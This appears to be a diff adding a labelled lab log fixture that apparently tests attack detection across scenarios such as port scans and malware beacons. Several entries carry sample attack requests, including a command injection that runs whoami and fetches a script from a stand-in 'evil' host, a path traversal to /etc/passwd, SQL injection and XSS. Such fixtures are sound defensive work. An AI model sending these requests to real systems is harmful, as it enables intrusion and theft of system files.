@@ -1,0 +1,7 @@
+lab-http src=192.168.56.20 dst=192.168.56.10 dpt=80 request="GET /health HTTP/1.1" scenario=benign_traffic source_pcap=benign_traffic.pcap
+lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request="GET /?cmd=whoami;wget http://evil/p.sh HTTP/1.1" scenario=command_injection source_pcap=command_injection.pcap
+lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request="GET /../../../../etc/passwd HTTP/1.1" scenario=directory_traversal source_pcap=directory_traversal.pcap
+lab-http src=192.168.56.20 dst=198.51.100.20 dpt=80 request="GET /gate.php HTTP/1.1" scenario=malware_c2 source_pcap=malware_c2.pcap
+lab-fw scan_event src=203.0.113.10 dst=192.168.56.10 flags=SYN scan_ports=110,143,21,22,23,25,443,53,80,8080,8443 note=multiple ports scenario=port_scan source_pcap=port_scan.pcap
+lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request="GET /search?q=UNION SELECT HTTP/1.1" scenario=sql_injection source_pcap=sql_injection.pcap
+lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request="GET /?q=<script>alert(1)</script> HTTP/1.1" scenario=xss source_pcap=xss.pcap
